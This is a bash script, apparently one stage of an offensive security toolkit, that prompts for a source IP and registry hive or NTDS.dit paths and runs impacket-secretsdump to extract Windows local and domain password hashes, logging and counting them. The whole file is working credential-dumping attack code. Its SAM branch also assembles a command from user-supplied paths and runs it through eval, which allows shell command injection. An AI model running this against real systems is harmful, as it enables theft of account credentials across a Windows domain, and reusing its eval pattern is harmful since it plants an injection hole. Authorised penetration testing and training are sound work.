#!/bin/bash

# ── Global Variables ──
TARGET_IP=""        # IP of the machine where hash files are stored
LOG_FILE=""         # Path to the session log file
OUTPUT_DIR=""       # Directory to save output files
HASH_OUTPUT_FILE="" # Path to the extracted hashes output file

hash_dumping() {
    {
        echo ""
        echo "========================================"
        echo "  [*] STAGE 3F: Hash Dumping (Impacket)"
        echo "========================================"
        echo ""
    } | tee -a "$LOG_FILE"

    local TARGET_IP       # IP of target/source machine
    local SAM_FILE        # Path to SAM registry hive
    local SECURITY_FILE   # Path to SECURITY registry hive
    local SYSTEM_FILE     # Path to SYSTEM registry hive (needed for decryption key)
    local NTDS_FILE       # Path to NTDS.dit (Domain Controller database)
    local DUMP_TYPE       # Which method the user selects (1=SAM, 2=NTDS)

    echo "[*] Password Hash Dumping via Impacket"
    echo ""

    # Step 1: Get Target IP
    read -p "[?] Enter source IP (machine holding the hash files): " TARGET_IP

    if [[ -z "$TARGET_IP" ]]; then
        echo "[!] No IP provided. Returning to menu."
        return
    fi

    if ! [[ "$TARGET_IP" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        echo "[!] Invalid IP format. Returning to menu."
        return
    fi

    echo "[*] Source IP: $TARGET_IP"
    echo ""

    # Step 2: Check impacket is installed
    echo "[*] Checking if impacket-secretsdump is installed..."
    if ! command -v impacket-secretsdump &> /dev/null; then
        echo "[!] impacket-secretsdump not found."
        echo "[-] Install with: pip install impacket"
        echo "    Or on Kali: apt-get install python3-impacket"
        echo "[!] Returning to menu."
        return
    fi

    echo "[+] impacket-secretsdump found."
    echo ""

    # Step 3: Select Dump Method
    echo "[?] Select hash dump method:"
    echo "    1) SAM/SECURITY/SYSTEM  - Local Windows account hashes"
    echo "       (for regular Windows machines, not Domain Controllers)"
    echo "    2) NTDS.dit             - Domain Controller hashes"
    echo "       (contains hashes for ALL domain accounts)"
    read -p "[?] Enter choice (1 or 2): " DUMP_TYPE

    # Prepare timestamped output file to store extracted hashes
    HASH_OUTPUT_FILE="$OUTPUT_DIR/hashes_${TARGET_IP}_$(date +"%Y%m%d_%H%M%S").txt"

    case "$DUMP_TYPE" in
        1)
            echo ""
            echo "[*] You will need the SAM, SECURITY, and/or SYSTEM hive files."
            echo "[*] These are typically found at C:\\Windows\\System32\\config\\ on the target."
            echo ""
            echo "[?] Provide paths to the registry hive files:"

            read -p "[?] Path to SAM file (or press Enter to skip): " SAM_FILE
            read -p "[?] Path to SECURITY file (or press Enter to skip): " SECURITY_FILE
            read -p "[?] Path to SYSTEM file (or press Enter to skip): " SYSTEM_FILE

            if [[ -z "$SAM_FILE" ]] && [[ -z "$SECURITY_FILE" ]] && [[ -z "$SYSTEM_FILE" ]]; then
                echo "[!] At least one file must be provided. Returning to menu."
                return
            fi

            for FILE in "$SAM_FILE" "$SECURITY_FILE" "$SYSTEM_FILE"; do
                if [[ -n "$FILE" ]] && [[ ! -f "$FILE" ]]; then
                    echo "[!] File not found: $FILE"
                    echo "[!] Returning to menu."
                    return
                fi
            done

            echo ""
            echo "[*] Dumping hashes from SAM/SECURITY/SYSTEM..."
            echo "[*] Hash dumping from SAM/SECURITY/SYSTEM files (source: $TARGET_IP)" | tee -a "$LOG_FILE"

            local IMPACKET_CMD="impacket-secretsdump"

            if [[ -n "$SAM_FILE" ]]; then
                IMPACKET_CMD="$IMPACKET_CMD -sam '$SAM_FILE'"
            fi
            if [[ -n "$SECURITY_FILE" ]]; then
                IMPACKET_CMD="$IMPACKET_CMD -security '$SECURITY_FILE'"
            fi
            if [[ -n "$SYSTEM_FILE" ]]; then
                IMPACKET_CMD="$IMPACKET_CMD -system '$SYSTEM_FILE'"
            fi

            IMPACKET_CMD="$IMPACKET_CMD LOCAL"

            eval "$IMPACKET_CMD" 2>&1 | tee -a "$HASH_OUTPUT_FILE"
            ;;

        2)
            echo ""
            echo "[*] NTDS.dit contains hashes for all domain accounts."
            echo "[*] You will need both NTDS.dit and the SYSTEM hive."
            echo "[*] NTDS.dit is typically at C:\\Windows\\NTDS\\NTDS.dit on the DC."
            echo ""

            read -p "[?] Path to NTDS.dit file: " NTDS_FILE

            if [[ -z "$NTDS_FILE" ]]; then
                echo "[!] NTDS.dit path is required. Returning to menu."
                return
            fi

            if [[ ! -f "$NTDS_FILE" ]]; then
                echo "[!] File not found: $NTDS_FILE"
                return
            fi

            read -p "[?] Path to SYSTEM hive file: " SYSTEM_FILE

            if [[ -z "$SYSTEM_FILE" ]]; then
                echo "[!] SYSTEM hive is required to decrypt NTDS.dit. Returning to menu."
                return
            fi

            if [[ ! -f "$SYSTEM_FILE" ]]; then
                echo "[!] File not found: $SYSTEM_FILE"
                return
            fi

            echo ""
            echo "[*] Dumping hashes from NTDS.dit..."
            echo "[*] Hash dumping from NTDS.dit (source: $TARGET_IP - Domain Controller)" | tee -a "$LOG_FILE"

            impacket-secretsdump -ntds "$NTDS_FILE" -system "$SYSTEM_FILE" LOCAL 2>&1 | tee -a "$HASH_OUTPUT_FILE"
            ;;

        *)
            echo "[!] Invalid choice. Returning to menu."
            return
            ;;
    esac

    echo "" | tee -a "$LOG_FILE"
    echo "[+] Hash dumping complete." | tee -a "$LOG_FILE"
    echo "[+] Hashes saved to: $HASH_OUTPUT_FILE" | tee -a "$LOG_FILE"

    # Step 4: Count extracted hashes
    local HASH_COUNT=$(grep -c ":" "$HASH_OUTPUT_FILE" 2>/dev/null || echo "0")
    echo "[*] Total hashes extracted: $HASH_COUNT" | tee -a "$LOG_FILE"

    # Step 5: Append Summary to Log
    {
        echo "=== Hash Dumping Details ==="
        echo "Source IP:   $TARGET_IP"
        echo "Method:      $([[ $DUMP_TYPE -eq 1 ]] && echo 'SAM/SECURITY/SYSTEM' || echo 'NTDS.dit')"
        echo "Timestamp:   $(date +"%Y-%m-%d %H:%M:%S")"
        echo "Output File: $HASH_OUTPUT_FILE"
        echo "Hashes:      $HASH_COUNT"
        echo ""
    } >> "$LOG_FILE"

    echo "" | tee -a "$LOG_FILE"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    OUTPUT_DIR="${OUTPUT_DIR:-.}"
    LOG_FILE="${LOG_FILE:-/tmp/hash_dump_test.log}"

    echo "[*] Stage 3F Hash Dumping"
    echo "[*] Log file: $LOG_FILE"
    echo "[*] Output directory: $OUTPUT_DIR"
    echo ""

    hash_dumping
fi
